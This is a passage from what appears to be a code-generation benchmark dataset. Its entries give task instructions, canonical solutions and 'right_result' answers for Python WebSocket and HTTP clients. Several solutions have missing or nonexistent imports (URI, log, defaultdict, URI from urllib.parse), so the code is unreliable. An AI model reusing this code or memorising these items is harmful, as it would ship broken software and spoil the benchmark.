    "Canonical_solution": "import asyncio\nimport json\nfrom typing import (\n    Any,\n    List,\n    Optional,\n    Tuple,\n    Union,\n    cast,\n)\nfrom websockets.client import (\n    connect,\n)\nfrom websockets.legacy.client import (\n    WebSocketClientProtocol,\n)\nfrom web3.providers.base import (\n    JSONBaseProvider,\n)\nfrom web3.types import (\n    RPCEndpoint,\n    RPCResponse,\n)\n\nclass PersistentWebSocket:\n    def __init__(self, endpoint_uri: str, websocket_kwargs: Any) -> None:\n        self.ws: Optional[WebSocketClientProtocol] = None\n        self.endpoint_uri = endpoint_uri\n        self.websocket_kwargs = websocket_kwargs\n\n    async def __aenter__(self) -> WebSocketClientProtocol:\n        if self.ws is None:\n            self.ws = await connect(uri=self.endpoint_uri, **self.websocket_kwargs)\n        return self.ws\n\n    async def __aexit__(\n        self,\n        exc_type: type,\n        exc_val: BaseException,\n        exc_tb: Any,\n    ) -> None:\n        if exc_val is not None:\n            try:\n                await self.ws.close()\n            except Exception:\n                pass\n            self.ws = None\n\nclass LegacyWebSocketProvider(JSONBaseProvider):\n    _loop = None\n\n    def __init__(\n        self,\n        endpoint_uri: Optional[Union[str, URI]] = None,\n        websocket_kwargs: Optional[Any] = None,\n        websocket_timeout: int = 30,\n        **kwargs: Any,\n    ) -> None:\n        self.endpoint_uri = endpoint_uri\n        self.websocket_timeout = websocket_timeout\n        if websocket_kwargs is None:\n            websocket_kwargs = {}\n        self.conn = PersistentWebSocket(self.endpoint_uri, websocket_kwargs)\n        super().__init__(**kwargs)\n\n    async def coro_make_request(self, request_data: bytes) -> RPCResponse:\n        async with self.conn as conn:\n            await asyncio.wait_for(\n                conn.send(request_data), timeout=self.websocket_timeout\n            )\n            return json.loads(\n                await asyncio.wait_for(conn.recv(), timeout=self.websocket_timeout)\n            )\n\n    def make_request(self, method: RPCEndpoint, params: Any) -> RPCResponse:\n        request_data = self.encode_rpc_request(method, params)\n        future = asyncio.run_coroutine_threadsafe(\n            self.coro_make_request(request_data), LegacyWebSocketProvider._loop\n        )\n        return future.result()\n\n    def make_batch_request(\n        self, requests: List[Tuple[RPCEndpoint, Any]]\n    ) -> List[RPCResponse]:\n        request_data = self.encode_batch_rpc_request(requests)\n        future = asyncio.run_coroutine_threadsafe(\n            self.coro_make_request(request_data), LegacyWebSocketProvider._loop\n        )\n        response = cast(List[RPCResponse], future.result())\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nfrom typing import Any, Optional, List, Tuple, Type, Union, Dict, Awaitable\nfrom websockets.client import WebSocketClientProtocol, connect\nfrom websockets.exceptions import ConnectionClosed\nfrom urllib.parse import urlparse, URI\nfrom contextlib import asynccontextmanager\nfrom jsonrpcclient import Request, Response, parse\n\nclass PersistentWebSocket:\n    def __init__(self, endpoint_uri: str, **websocket_kwargs: Any):\n        self.ws: Optional[WebSocketClientProtocol] = None\n        self.endpoint_uri = endpoint_uri\n        self.websocket_kwargs = websocket_kwargs\n        self._lock = asyncio.Lock()\n\n    async def __aenter__(self) -> WebSocketClientProtocol:\n        await self.connect()\n        return self.ws\n\n    async def __aexit__(self, exc_type: type, exc_val: BaseException, exc_tb: Any) -> None:\n        if exc_type:\n            await self.disconnect()\n\n    async def connect(self) -> None:\n        async with self._lock:\n            if self.ws and not self.ws.closed:\n                return\n\n            try:\n                self.ws = await connect(self.endpoint_uri, **self.websocket_kwargs)\n            except Exception as e:\n                await self.handle_reconnect(e)\n\n    async def disconnect(self) -> None:\n        async with self._lock:\n            if self.ws and not self.ws.closed:\n                try:\n                    await self.ws.close()\n                except Exception:\n                    pass\n            self.ws = None\n\n    async def handle_reconnect(self, error: Exception):\n        await self.disconnect()\n        # Implement exponential backoff or retry logic here if needed\n        raise error\n\n    async def send(self, message: str) -> None:\n        if not self.ws or self.ws.closed:\n            await self.connect()\n        try:\n            await self.ws.send(message)\n        except ConnectionClosed as e:\n            await self.handle_reconnect(e)\n\n    async def recv(self) -> str:\n        if not self.ws or self.ws.closed:\n            await self.connect()\n        try:\n            return await self.ws.recv()\n        except ConnectionClosed as e:\n            await self.handle_reconnect(e)\n            return await self.ws.recv()  # Try again after reconnecting\n\nclass JSONBaseProvider:\n    pass  # Assume this is a base class for JSON-RPC providers\n\nRPCResponse = Dict[str, Any]\nRPCEndpoint = str\n\nclass LegacyWebSocketProvider(JSONBaseProvider):\n    _loop: Any = None\n    endpoint_uri: Optional[Union[str, URI]] = None\n    websocket_timeout: int = 10\n\n    def __init__(self, endpoint_uri: str, timeout: int = 10):\n        self.endpoint_uri = endpoint_uri\n        self.websocket_timeout = timeout\n        self.conn = PersistentWebSocket(str(endpoint_uri), timeout=timeout)\n        if not self._loop:\n            self._loop = asyncio.get_event_loop()\n\n    def coro_make_request(self, request_data: bytes) -> RPCResponse:\n        async def _async_make_request():\n            try:\n                async with self.conn as ws:\n                    await ws.send(request_data.decode())\n                    response = await asyncio.wait_for(ws.recv(), timeout=self.websocket_timeout)\n                    result = parse(response)\n                    if isinstance(result, Response):\n                        return result.data.as_dict()\n                    else:\n                        return {\"error\": \"Invalid response format\"}\n            except asyncio.TimeoutError:\n                raise TimeoutError(f\"WebSocket operation timed out after {self.websocket_timeout} seconds\")\n            except Exception as e:\n                raise RuntimeError(f\"WebSocket request failed: {str(e)}\")\n\n        return self._loop.run_until_complete(_async_make_request())\n\n    def make_request(self, method: RPCEndpoint, params: Any) -> RPCResponse:\n        request = Request(method, params).serialize()\n        return self.coro_make_request(request.encode())\n\n    def make_batch_request(self, requests: List[Tuple[RPCEndpoint, Any]]) -> List[RPCResponse]:\n        async def _async_batch_request():\n            try:\n                async with self.conn as ws:\n                    results = []\n                    for method, params in requests:\n                        req = Request(method, params).serialize()\n                        await ws.send(req)\n                        response = await asyncio.wait_for(ws.recv(), timeout=self.websocket_timeout)\n                        result = parse(response)\n                        results.append(result.data.as_dict())\n                    return results\n            except asyncio.TimeoutError:\n                raise TimeoutError(f\"WebSocket operation timed out after {self.websocket_timeout} seconds\")\n            except Exception as e:\n                raise RuntimeError(f\"WebSocket batch request failed: {str(e)}\")\n\n        return self._loop.run_until_complete(_async_batch_request())"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a WebSocket client class for streaming financial market data with authentication, subscription management, and message handling capabilities.\n\nClass Description: The _DataStream class establishes and maintains a WebSocket connection to a financial data streaming service. It handles authentication, manages subscriptions to different types of market data (trades, quotes, bars), processes incoming messages, and provides methods for controlling the connection lifecycle.\n\nAttributes:\n- _endpoint: str - WebSocket server URL\n- _key_id: str - API key for authentication\n- _secret_key: str - API secret for authentication\n- _ws: WebSocketClientProtocol - Active WebSocket connection\n- _running: bool - Connection status flag\n- _loop: asyncio.AbstractEventLoop - Event loop reference\n- _raw_data: bool - Flag for raw data processing\n- _stop_stream_queue: queue.Queue - Queue for stop signals\n- _handlers: Dict[str, Dict] - Dictionary of message handlers per data type\n- _name: str - Connection name identifier\n- _should_run: bool - Control flag for main loop\n- _max_frame_size: int - Maximum WebSocket frame size\n- _websocket_params: Dict - WebSocket connection parameters\n\nMethods:\n- __init__(endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None - Initialize the data stream with connection parameters\n- _connect() -> None - Establish WebSocket connection\n- _auth() -> None - Authenticate with the server\n- _start_ws() -> None - Combined connection and authentication\n- close() -> None - Close the WebSocket connection\n- stop_ws() -> None - Signal to stop the WebSocket connection\n- _consume() -> None - Main message processing loop\n- _dispatch(msg: Dict) -> None - Route messages to appropriate handlers\n- _subscribe(handler: Callable, symbols: List[str], handlers: Dict) -> None - Internal subscription management\n- _subscribe_all() -> None - Send all active subscriptions to server\n- _run_forever() -> None - Main connection management loop\n- subscribe_trades(handler: Callable, *symbols: str) -> None - Subscribe to trade data\n- subscribe_quotes(handler: Callable, *symbols: str) -> None - Subscribe to quote data\n- subscribe_bars(handler: Callable, *symbols: str) -> None - Subscribe to bar data\n- subscribe_updated_bars(handler: Callable, *symbols: str) -> None - Subscribe to updated bar data\n- subscribe_daily_bars(handler: Callable, *symbols: str) -> None - Subscribe to daily bar data\n- stop() -> None - Stop the WebSocket connection and processing",
    "Canonical_solution": "import asyncio\nimport websockets\nimport msgpack\nimport queue\nfrom typing import Dict, Optional\n\nclass _DataStream:\n    def __init__(self,\n                 endpoint: str,\n                 key_id: str,\n                 secret_key: str,\n                 raw_data: bool = False,\n                 websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = None\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {\n            'trades':      {},\n            'quotes':      {},\n            'bars':        {},\n            'updatedBars': {},\n            'dailyBars':   {},\n        }\n        self._name = 'data'\n        self._should_run = True\n        self._max_frame_size = 32768\n        self._websocket_params = websocket_params or {\n            \"ping_interval\": 10,\n            \"ping_timeout\": 180,\n            \"max_queue\": 1024,\n        }\n\n    async def _connect(self):\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers={'Content-Type': 'application/msgpack'},\n            **self._websocket_params\n        )\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'connected':\n            raise ValueError('connected message not received')\n\n    async def _auth(self):\n        await self._ws.send(\n            msgpack.packb({\n                'action': 'auth',\n                'key':    self._key_id,\n                'secret': self._secret_key,\n            }))\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] == 'error':\n            raise ValueError(msg[0].get('msg', 'auth failed'))\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'authenticated':\n            raise ValueError('failed to authenticate')\n\n    async def _start_ws(self):\n        await self._connect()\n        await self._auth()\n\n    async def close(self):\n        if self._ws:\n            await self._ws.close()\n            self._ws = None\n            self._running = False\n\n    async def stop_ws(self):\n        self._should_run = False\n        if self._stop_stream_queue.empty():\n            self._stop_stream_queue.put_nowait({\"should_stop\": True})\n\n    async def _consume(self):\n        while True:\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                await self.close()\n                break\n            else:\n                try:\n                    r = await asyncio.wait_for(self._ws.recv(), 5)\n                    msgs = msgpack.unpackb(r)\n                    for msg in msgs:\n                        await self._dispatch(msg)\n                except asyncio.TimeoutError:\n                    pass\n\n    async def _dispatch(self, msg):\n        msg_type = msg.get('T')\n        symbol = msg.get('S')\n        if msg_type == 't':\n            handler = self._handlers['trades'].get(\n                symbol, self._handlers['trades'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'q':\n            handler = self._handlers['quotes'].get(\n                symbol, self._handlers['quotes'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'b':\n            handler = self._handlers['bars'].get(\n                symbol, self._handlers['bars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'u':\n            handler = self._handlers['updatedBars'].get(\n                symbol, self._handlers['updatedBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'd':\n            handler = self._handlers['dailyBars'].get(\n                symbol, self._handlers['dailyBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'error':\n            log.error(f'error: {msg.get(\"msg\")} ({msg.get(\"code\")})')\n\n    def _subscribe(self, handler, symbols, handlers):\n        for symbol in symbols:\n            handlers[symbol] = handler\n        if self._running:\n            asyncio.run_coroutine_threadsafe(\n                self._subscribe_all(), self._loop\n            ).result()\n\n    async def _subscribe_all(self):\n        msg = defaultdict(list)\n        for k, v in self._handlers.items():\n            if v:\n                for s in v.keys():\n                    msg[k].append(s)\n        msg['action'] = 'subscribe'\n        bs = msgpack.packb(msg)\n        frames = (bs[i:i+self._max_frame_size]\n                  for i in range(0, len(bs), self._max_frame_size))\n        await self._ws.send(frames)\n\n    async def _run_forever(self):\n        self._loop = asyncio.get_running_loop()\n        while not any(v for k, v in self._handlers.items()):\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                return\n            await asyncio.sleep(0.1)\n        self._should_run = True\n        self._running = False\n        while True:\n            try:\n                if not self._should_run:\n                    return\n                if not self._running:\n                    await self._start_ws()\n                    await self._subscribe_all()\n                    self._running = True\n                await self._consume()\n            except websockets.WebSocketException as wse:\n                await self.close()\n                self._running = False\n            finally:\n                await asyncio.sleep(0.01)\n\n    def subscribe_trades(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['updatedBars'])\n\n    def subscribe_daily_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['dailyBars'])\n\n    def stop(self):\n        if self._loop.is_running():\n            asyncio.run_coroutine_threadsafe(\n                self.stop_ws(),\n                self._loop).result()",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nimport json\nimport time\nimport hmac\nimport hashlib\nimport base64\nfrom typing import Optional, Dict, List, Callable, Any\nfrom collections import defaultdict\nimport websockets\nimport queue\n\nclass _DataStream:\n    def __init__(self, endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws: Optional[websockets.WebSocketClientProtocol] = None\n        self._running = False\n        self._loop = asyncio.get_event_loop()\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = defaultdict(dict)\n        self._name = 'alpaca_data_stream'\n        self._should_run = True\n        self._max_frame_size = 2 ** 20 * 10  # 10MB\n        self._websocket_params = websocket_params or {}\n\n    async def _connect(self) -> None:\n        headers = {'Content-Type': 'application/json'}\n        ws_params = {\n            'max_frame_size': self._max_frame_size,\n            **self._websocket_params\n        }\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers=headers,\n            **ws_params\n        )\n        self._running = True\n\n    async def _auth(self) -> None:\n        if not self._ws:\n            raise Exception('WebSocket connection not established')\n        \n        auth = {\n            'action': 'authenticate',\n            'data': {\n                'key_id': self._key_id,\n                'secret_key': self._secret_key\n            }\n        }\n        await self._ws.send(json.dumps(auth))\n        response = await self._ws.recv()\n        resp_dict = json.loads(response)\n        if resp_dict.get('stream') != 'authentication' or resp_dict.get('data', {}).get('status') != 'success':\n            raise Exception('Authentication failed')\n\n    def _start_ws(self) -> None:\n        self._loop.run_until_complete(self._run_forever())\n\n    def close(self) -> None:\n        self._loop.run_until_complete(self.stop_ws())\n\n    async def stop_ws(self) -> None:\n        self._should_run = False\n        if self._ws:\n            await self._ws.close()\n        self._running = False\n\n    async def _consume(self) -> None:\n        while self._running and self._ws:\n            try:\n                msg = await self._ws.recv()\n                if isinstance(msg, str):\n                    msg = json.loads(msg)\n                self._dispatch(msg)\n            except websockets.exceptions.ConnectionClosed:\n                break\n            except Exception as e:\n                print(f\"Error processing message: {e}\")\n                continue\n\n    def _dispatch(self, msg: Dict) -> None:\n        stream = msg.get('stream')\n        data = msg.get('data')\n        if stream == 'authenticated':\n            return\n        if not stream or not data:\n            return\n        \n        parts = stream.split('.')\n        if len(parts) < 2:\n            return\n        \n        msg_type, symbol = parts[0], parts[1]\n        handlers = self._handlers.get(msg_type, {})\n        for handler in handlers.values():\n            handler(symbol, data)\n\n    def _subscribe(self, handler: Callable, symbols: List[str], handlers: Dict) -> None:\n        for symbol in symbols:\n            handlers[symbol] = handler\n\n    def _subscribe_all(self) -> None:\n        if not self._ws:\n            raise Exception('WebSocket connection not established')\n        \n        subs = []\n        for msg_type, handlers in self._handlers.items():\n            if handlers:\n                subs.append(f'{msg_type}.{\"*\"}')\n        \n        sub_msg = {\n            'action': 'listen',\n            'data': {\n                'streams': subs\n            }\n        }\n        self._loop.run_until_complete(self._ws.send(json.dumps(sub_msg)))\n\n    def subscribe_trades(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers['trade'])\n        self._subscribe_all()\n\n    def subscribe_quotes(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers['quote'])\n        self._subscribe_all()\n\n    def subscribe_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers['bar'])\n        self._subscribe_all()\n\n    def subscribe_updated_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers['updated_bar'])\n        self._subscribe_all()\n\n    def subscribe_daily_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers['daily_bar'])\n        self._subscribe_all()\n\n    def stop(self) -> None:\n        self._should_run = False\n        self._stop_stream_queue.put_nowait(True)\n\n    async def _run_forever(self) -> None:\n        while self._should_run:\n            try:\n                await self._connect()\n                await self._auth()\n                await self._consume()\n            except Exception as e:\n                print(f\"Connection error: {e}\")\n            finally:\n                await self.stop_ws()\n                await asyncio.sleep(5)  # Reconnect after 5 seconds"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create asynchronous HTTP client functions to retrieve user and group avatars from specified URLs using the httpx library with retry logic for error handling.\n\nFunction Description: The functions make HTTP GET requests to fetch avatar images (in bytes) from predefined URL patterns. Each function implements retry logic (3 attempts) and error logging if the request fails.\n\nInput:\n- For get_user_avatar: uid (int | str) - User ID to construct the avatar URL\n- For get_group_avatar: gid (int | str) - Group ID to construct the avatar URL\n\nOutput:\n- bytes | None: Returns the avatar image content as bytes if successful, or None if all attempts fail after retries",
    "Canonical_solution": "import httpx\nfrom zhenxun.services.log import logger\n\nasync def get_user_avatar(uid: int | str) -> bytes | None:\n    \"\"\"\u5feb\u6377\u83b7\u53d6\u7528\u6237\u5934\u50cf\n\n    \u53c2\u6570:\n        uid: \u7528\u6237id\n    \"\"\"\n    url = f\"http://q1.qlogo.cn/g?b=qq&nk={uid}&s=160\"\n    async with httpx.AsyncClient() as client:\n        for _ in range(3):\n            try:\n                return (await client.get(url)).content\n            except Exception:\n                logger.error(\"\u83b7\u53d6\u7528\u6237\u5934\u50cf\u9519\u8bef\", \"Util\", target=uid)\n    return None\n\nasync def get_group_avatar(gid: int | str) -> bytes | None:\n    \"\"\"\u5feb\u6377\u83b7\u53d6\u7528\u7fa4\u5934\u50cf\n\n    \u53c2\u6570:\n        gid: \u7fa4\u53f7\n    \"\"\"\n    url = f\"http://p.qlogo.cn/gh/{gid}/{gid}/640/\"\n    async with httpx.AsyncClient() as client:\n        for _ in range(3):\n            try:\n                return (await client.get(url)).content\n            except Exception:\n                logger.error(\"\u83b7\u53d6\u7fa4\u5934\u50cf\u9519\u8bef\", \"Util\", target=gid)\n    return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\nimport logging\n\nlogging.basicConfig(level=logging.ERROR)\n\nasync def get_user_avatar(uid: int | str) -> bytes | None:\n    url = f\"https://example.com/avatars/users/{uid}.jpg\"\n    async with httpx.AsyncClient() as client:\n        for attempt in range(3):\n            try:\n                response = await client.get(url)\n                response.raise_for_status()\n                return response.content\n            except (httpx.RequestError, httpx.HTTPStatusError) as e:\n                logging.error(f\"Attempt {attempt + 1} failed for user avatar (UID: {uid}): {e}\")\n                if attempt < 2:\n                    await asyncio.sleep(2 ** attempt)\n        return None\n\nasync def get_group_avatar(gid: int | str) -> bytes | None:\n    url = f\"https://example.com/avatars/groups/{gid}.jpg\"\n    async with httpx.AsyncClient() as client:\n        for attempt in range(3):\n            try:\n                response = await client.get(url)\n                response.raise_for_status()\n                return response.content\n            except (httpx.RequestError, httpx.HTTPStatusError) as e:\n                logging.error(f\"Attempt {attempt + 1} failed for group avatar (GID: {gid}): {e}\")\n                if attempt < 2:\n                    await asyncio.sleep(2 ** attempt)\n        return None"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Create a WebSocket client in Python using asyncio and websockets libraries to connect to a WebSocket server, subscribe to a channel, and receive messages, optionally decompressing them if they are gzipped.\n\nFunction Description: The function establishes a WebSocket connection to a specified URI, sends a subscription message, and receives a specified number of messages from the server. It can handle gzip-compressed messages by decompressing them before display.\n\nInput:\n- uri (str): The WebSocket server URI to connect to (e.g., 'wss://api.huobi.pro/ws').\n- sub (str): The subscription message to send to the server (e.g., '{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}').\n- is_gzip (bool): A flag indicating whether the received messages are gzip-compressed.\n- count (int): The number of messages to receive before exiting.\n\nOutput: None (The function prints received messages to the console).",
    "Canonical_solution": "import argparse\nimport asyncio\nimport zlib\nimport websockets\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        print(f\"> {sub}\")\n\n        for i in range(count):\n            response = await websocket.recv()\n            if not is_gzip:\n                print(f\"< {response}\")\n            else:\n                print(f\"< {zlib.decompress(response, 16 + zlib.MAX_WBITS)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--uri', default='wss://api.huobi.pro/ws', help='URI to connect to')\n    parser.add_argument('--sub', default='{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}', help='Subscription string')\n    parser.add_argument('--count', default=3, type=int, help='Number of messages to receive before exiting')\n    parser.add_argument('-z', action='store_true', help='Use gzip on messages')\n    args = parser.parse_args()\n\n    asyncio.get_event_loop().run_until_complete(\n        websocket_client(args.uri, args.sub, args.z, args.count)\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nimport websockets\nimport gzip\nimport json\n\nasync def subscribe_websocket(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        for _ in range(count):\n            message = await websocket.recv()\n            if is_gzip:\n                message = gzip.decompress(message).decode('utf-8')\n            print(message)\n\ndef main(uri, sub, is_gzip, count):\n    asyncio.run(subscribe_websocket(uri, sub, is_gzip, count))"
  },
  {
    "Task_id": 441,
    "Instruction": "Task Description: Implement a WebSocket client class for chat functionality that handles connection, message sending/receiving, and error handling with proper thread management.\n\nClass Description: ChatNewWebSocket is a WebSocket client implementation for chat applications that manages WebSocket connections, message queuing, and event callbacks in separate threads. It provides methods for starting/stopping connections, sending messages, and handling WebSocket events.\n\nAttributes:\n- _parent: [weakref.ref] - Weak reference to the parent object for callback handling\n- ws: [WebSocketApp] - WebSocketApp instance for managing the connection\n- _inQueue: [Queue] - Thread-safe queue for outgoing messages\n- sendThread: [Thread] - Thread for processing outgoing messages\n\nMethods:\n- __init__(parent) -> None - Initializes the WebSocket client with parent reference and starts send thread\n- parent() -> object - Property to dereference the weak parent reference\n- Stop() -> None - Stops the send thread by putting empty string in queue\n- SendDataRun() -> None - Thread target function that processes outgoing messages from queue\n- _SendData(data) -> None - Internal method to send data through WebSocket and emit appropriate events\n- _Send(msg) -> None - Internal method to send raw message through WebSocket\n- Send(data) -> None - Public method to queue data for sending\n- on_message(ws, message) -> None - Callback for received WebSocket messages\n- on_error(ws, error) -> None - Callback for WebSocket errors\n- on_close(ws) -> None - Callback for WebSocket connection close\n- on_open(ws) -> None - Callback for WebSocket connection open\n- Start(roomId, token, url) -> None - Starts WebSocket connection with given parameters in new thread\n- Close() -> None - Closes active WebSocket connection",
    "Canonical_solution": "import threading\nimport weakref\nfrom queue import Queue\nimport websocket\n\nclass ChatNewWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.setName(\"ChatSendThread\")\n        self.sendThread.setDaemon(True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            task = self._inQueue.get(True)\n            self._inQueue.task_done()\n            try:\n                if task == \"\":\n                    break\n                self._SendData(task)\n            except Exception as es:\n                pass\n\n    def _SendData(self, data):\n        self._Send(data)\n        if \"send_image\" in data:\n            self.parent.websocket.emit(self.parent.SendImg, data)\n        else:\n            self.parent.websocket.emit(self.parent.SendMsg2, data)\n\n    def _Send(self, msg):\n        try:\n            if self.ws:\n                self.ws.send(msg)\n        except Exception as es:\n            pass\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        self.parent.websocket.emit(self.parent.Msg, message)\n\n    def on_error(self, ws, error):\n        self.parent.websocket.emit(self.parent.ErrorMsg, str(error))\n\n    def on_close(self, ws):\n        self.parent.websocket.emit(self.parent.Leave, \"\")\n\n    def on_open(self, ws):\n        self.parent.websocket.emit(self.parent.Enter, \"\")\n\n    def Start(self, roomId, token, url):\n        url = url.replace(\"https\", \"wss\").replace(\"http\", \"ws\") + \"?token={}&room={}\".format(token, roomId)\n        def Run():\n            ws = websocket.WebSocketApp(url,\n                                      on_open=self.on_open,\n                                      on_message=self.on_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close)\n            self.ws = ws\n            ws.run_forever(ping_interval=30)\n\n        thread = threading.Thread(target=Run)\n        thread.setDaemon(True)\n        thread.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n            self.ws = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "right_result": "import threading\nimport json\nimport weakref\nimport queue\nfrom websocket import WebSocketApp\n\nclass ChatNewWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = queue.Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun, daemon=True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            try:\n                data = self._inQueue.get()\n                if not data:\n                    break\n                self._SendData(data)\n                self._inQueue.task_done()\n            except Exception as e:\n                if self.parent:\n                    self.parent.OnChatError(str(e))\n                break\n\n    def _SendData(self, data):\n        try:\n            if self.ws and self.ws.sock and self.ws.sock.connected:\n                self._Send(json.dumps(data))\n            else:\n                if self.parent:\n                    self.parent.OnChatError(\"WebSocket not connected\")\n        except Exception as e:\n            if self.parent:\n                self.parent.OnChatError(str(e))\n\n    def _Send(self, msg):\n        if self.ws and self.ws.sock and self.ws.sock.connected:\n            self.ws.send(msg)\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        if self.parent:\n            self.parent.OnChatMessage(message)\n\n    def on_error(self, ws, error):\n        if self.parent:\n            self.parent.OnChatError(str(error))\n\n    def on_close(self, ws):\n        if self.parent:\n            self.parent.OnChatClose()\n\n    def on_open(self, ws):\n        if self.parent:\n            self.parent.OnChatOpen()\n\n    def Start(self, roomId, token, url):\n        def run():\n            headers = {\"Authorization\": f\"Bearer {token}\", \"Room-ID\": roomId}\n            self.ws = WebSocketApp(\n                url,\n                header=headers,\n                on_message=self.on_message,\n                on_error=self.on_error,\n                on_close=self.on_close,\n                on_open=self.on_open\n            )\n            self.ws.run_forever()\n        \n        threading.Thread(target=run, daemon=True).start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a WebSocket client class in Python that handles WebSocket connections, message sending/receiving, and callbacks for various WebSocket events. The class should manage commands and notifications with appropriate callbacks and ensure thread-safe operations between the WebSocket thread and the main thread.\n\nClass Description: The Protocol class encapsulates WebSocket connection functionality, providing methods to connect to a WebSocket server, send commands with callbacks, subscribe/unsubscribe to notifications, and handle incoming messages. It manages thread synchronization to safely execute callbacks on the main thread.\n\nAttributes:\n- next_id: [int] - Counter for generating unique command IDs\n- commands: [dict] - Dictionary storing pending commands with their IDs as keys\n- notifications: [dict] - Dictionary storing subscribed notifications with their names as keys\n- url: [str] - WebSocket server URL to connect to\n- on_open: [function] - Callback function for WebSocket open event\n- on_close: [function] - Callback function for WebSocket close event\n- socket: [WebSocketApp] - Instance of WebSocketApp managing the connection\n\nMethods:\n- connect(url, on_open=None, on_close=None) -> [None] - Initiates a WebSocket connection to the specified URL with optional open and close callbacks. Starts a new thread for the WebSocket connection.\n- thread_callback() -> [None] - Thread procedure that sets up WebSocket callbacks and starts the connection loop.\n- send(command, callback=None, options=None) -> [None] - Sends a command through the WebSocket with an optional callback and options. Assigns a unique ID to the command.\n- subscribe(notification, callback) -> [None] - Subscribes to a notification with the specified callback.\n- unsubscribe(notification) -> [None] - Unsubscribes from a notification.\n- message_callback(ws, message) -> [None] - Handles incoming WebSocket messages, parsing them and invoking appropriate command or notification callbacks.\n- open_callback(ws) -> [None] - Handles WebSocket open event, invoking the registered on_open callback.\n- close_callback(ws) -> [None] - Handles WebSocket close event, invoking the registered on_close callback.\n- to_main_thread(f, args) -> [None] - Helper method to execute a function on the main thread with the given arguments.",
